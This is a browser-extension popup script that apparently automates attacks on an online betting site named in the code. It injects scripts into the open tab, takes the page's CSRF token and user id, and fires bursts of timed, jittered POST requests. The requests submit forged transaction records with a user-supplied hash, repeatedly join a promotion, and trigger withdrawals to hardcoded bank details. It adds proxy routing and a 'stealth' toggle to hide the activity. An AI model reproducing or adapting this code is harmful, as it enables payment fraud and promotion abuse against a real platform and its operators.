/**
 * 🔱 GHOST-SOVEREIGNTY Popup Controller - Simplified (popup.js)
 * Manages simple inputs, active check, and proxy configs.
 */

document.addEventListener('DOMContentLoaded', async () => {
  const strikeSelect = document.getElementById('strike-type');
  const hashWrapper = document.getElementById('hash-wrapper');

  // Toggle hash input visibility based on action
  strikeSelect.addEventListener('change', () => {
    if (strikeSelect.value === 'quantum') {
      hashWrapper.classList.remove('hidden');
    } else {
      hashWrapper.classList.add('hidden');
    }
  });

  // Stealth toggle persistence
  const stealthToggle = document.getElementById('stealth-toggle');
  chrome.storage.local.get(['stealth-masking-toggle'], (res) => {
    if (res['stealth-masking-toggle'] !== undefined) {
      stealthToggle.checked = res['stealth-masking-toggle'];
    }
  });

  stealthToggle.addEventListener('change', () => {
    chrome.storage.local.set({ 
      'stealth-masking-toggle': stealthToggle.checked,
      'modal-shredder-toggle': stealthToggle.checked 
    }, () => {
      log(`Stealth shield: ${stealthToggle.checked ? 'ENABLED' : 'DISABLED'}`, 'system');
      syncSettings();
    });
  });

  // Proxy Panel Toggle Collapse
  const proxyHeader = document.getElementById('btn-toggle-proxy-panel');
  const proxyContent = document.getElementById('proxy-settings-panel');
  const arrowIndicator = proxyHeader.querySelector('.arrow-indicator');

  proxyHeader.addEventListener('click', () => {
    const isHidden = proxyContent.classList.contains('hidden');
    if (isHidden) {
      proxyContent.classList.remove('hidden');
      arrowIndicator.innerText = '▲';
    } else {
      proxyContent.classList.add('hidden');
      arrowIndicator.innerText = '▼';
    }
  });

  // Load Saved Proxy Configs
  const proxyEnableToggle = document.getElementById('proxy-enable-toggle');
  const proxyHost = document.getElementById('proxy-host');
  const proxyPort = document.getElementById('proxy-port');
  const proxyUser = document.getElementById('proxy-user');
  const proxyPass = document.getElementById('proxy-pass');

  chrome.storage.local.get(['proxy_enabled', 'proxy_host', 'proxy_port', 'proxy_user', 'proxy_pass'], (res) => {
    if (res.proxy_enabled !== undefined) proxyEnableToggle.checked = res.proxy_enabled;
    if (res.proxy_host) proxyHost.value = res.proxy_host;
    if (res.proxy_port) proxyPort.value = res.proxy_port;
    if (res.proxy_user) proxyUser.value = res.proxy_user;
    if (res.proxy_pass) proxyPass.value = res.proxy_pass;
  });

  // Apply & Save Proxy Configuration Click
  document.getElementById('btn-save-proxy').addEventListener('click', () => {
    const enabled = proxyEnableToggle.checked;
    const host = proxyHost.value.trim();
    const port = proxyPort.value.trim();
    const user = proxyUser.value.trim();
    const pass = proxyPass.value.trim();

    if (enabled && (!host || !port)) {
      log('Proxy Host and Port are required when enabled.', 'error');
      return;
    }

    chrome.storage.local.set({
      proxy_enabled: enabled,
      proxy_host: host,
      proxy_port: port,
      proxy_user: user,
      proxy_pass: pass
    }, () => {
      log(`Proxy configurations saved.`, 'system');
      
      // Dispatch configurations to background worker
      chrome.runtime.sendMessage({
        action: "update_proxy",
        enabled: enabled,
        host: host,
        port: port,
        user: user,
        pass: pass
      }, (res) => {
        if (res && res.status === "applied") {
          log(`Proxy routing ACTIVATED successfully.`, 'success');
        } else {
          log(`Proxy routing DEACTIVATED.`, 'system');
        }
      });
    });
  });

  // Sync settings helper
  async function syncSettings() {
    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab) return;
      chrome.tabs.sendMessage(tab.id, { 
        action: "sync_settings", 
        settings: {
          'stealth-masking-toggle': stealthToggle.checked,
          'modal-shredder-toggle': stealthToggle.checked
        } 
      }).catch(() => {});
    } catch(e) {}
  }

  // Live session check
  async function auditSession() {
    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab) return;

      const url = new URL(tab.url);
      document.getElementById('session-host').innerText = url.hostname;

      const results = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: () => {
          const csrf = document.querySelector('meta[name="csrf-token"]')?.content 
                    || document.querySelector('input[name="_token"]')?.value 
                    || '';
          return { csrf };
        }
      });

      const statusEl = document.getElementById('session-status');
      if (results && results[0] && results[0].result && results[0].result.csrf) {
        statusEl.innerText = 'SYNCED';
        statusEl.className = 'value badge green';
      } else {
        statusEl.innerText = 'NOT FOUND';
        statusEl.className = 'value badge red';
      }
    } catch (e) {
      document.getElementById('session-host').innerText = 'System tab';
    }
  }

  await auditSession();
  setInterval(auditSession, 5000);

  // Simple logging function
  function log(text, type = 'info') {
    const feed = document.getElementById('log-feed');
    const entry = document.createElement('div');
    entry.className = `log-entry ${type}`;
    entry.innerText = `> ${text}`;
    feed.appendChild(entry);
    feed.scrollTop = feed.scrollHeight;
  }

  // Action fire event
  document.getElementById('btn-fire-strike').addEventListener('click', async () => {
    const vector = strikeSelect.value;
    const amount = document.getElementById('amount-input').value;
    const hash = document.getElementById('hash-input').value;
    const speed = document.getElementById('intensity-preset').value;

    let loopCount = 5;
    let baseDelay = 400;
    if (speed === 'safe') {
      loopCount = 3;
      baseDelay = 800;
    } else if (speed === 'fast') {
      loopCount = 15;
      baseDelay = 150;
    }

    log(`Starting ${vector.toUpperCase()} action...`, 'system');

    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tab) {
      log('No active browser tab found.', 'error');
      return;
    }

    if (vector === 'quantum' && !hash) {
      log('Transaction DNA hash is required.', 'error');
      return;
    }

    let successCount = 0;
    let failCount = 0;

    for (let i = 1; i <= loopCount; i++) {
      log(`Firing packet ${i}/${loopCount}...`, 'info');

      let results;
      try {
        results = await chrome.scripting.executeScript({
          target: { tabId: tab.id },
          args: [{ vector, amount, hash }],
          func: async (params) => {
            const token = document.querySelector('meta[name="csrf-token"]')?.content 
                       || document.querySelector('input[name="_token"]')?.value 
                       || '';
            
            let userId = 'UNKNOWN';
            if (window.user && window.user.id) userId = window.user.id;
            else if (window.userId) userId = window.userId;

            const prefix = window.location.hostname.includes('spinjeet.com') ? '/api2/v2' : '';
            const orderId = `INV_R${Date.now()}${Math.floor(Math.random() * 999999)}`;

            try {
              let res;
              if (params.vector === 'quantum') {
                res = await fetch(`${prefix}/storeTransaction`, {
                  method: 'POST',
                  headers: {
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-CSRF-TOKEN': token
                  },
                  body: `_token=${token}&hashed=${params.hash}&amount=${params.amount}&userid=${userId}&orderId=${orderId}`
                });
              } else if (params.vector === 'promo') {
                res = await fetch(`${prefix}/joinPromotion/22`, {
                  method: 'POST',
                  headers: {
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-CSRF-TOKEN': token
                  },
                  body: `_token=${token}&amount=${params.amount}`
                });
              } else {
                res = await fetch(`${prefix}/api2/v2/withdraw`, {
                  method: 'POST',
                  headers: {
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-CSRF-TOKEN': token
                  },
                  body: `_token=${token}&amount=${params.amount}&account_name=Account&account_number=123456&ifsc=SBIN0001234&bank_name=SBI`
                });
              }

              return { status: res.status };
            } catch (e) {
              return { status: 'ERR' };
            }
          }
        });
      } catch (err) {
        log(`Error: Cannot execute on this page (${err.message})`, 'error');
        break; // Exit the loop safely
      }

      if (results && results[0] && results[0].result) {
        const out = results[0].result;
        if (out.status === 200) {
          successCount++;
          log(`Packet ${i}: Success (200)`, 'success');
        } else {
          failCount++;
          log(`Packet ${i}: Failed (${out.status})`, 'warn');
        }
      } else {
        failCount++;
      }

      if (i < loopCount) {
        const jitter = Math.floor(Math.random() * 100);
        await new Promise(r => setTimeout(r, baseDelay + jitter));
      }
    }

    log(`Action finished. Done: ${successCount}, Failed: ${failCount}`, 'system');
  });
});
